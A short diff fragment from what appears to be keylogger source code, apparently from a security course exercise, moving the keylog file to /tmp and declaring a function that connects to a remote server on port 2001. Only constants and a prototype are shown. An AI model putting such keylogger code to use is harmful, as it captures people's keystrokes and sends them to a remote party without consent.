@@ -8,7 +8,7 @@
 
 #define REMOTE_PORT 2001
 #define POLL_DURATION 10
-#define FILE_LOCATION "/usr/home/comp6447/keylog_file"
+#define FILE_LOCATION "/tmp/keylog_file"
 #define DEBUG 1
 
 int attempt_connection_to_server(char * remote_address);
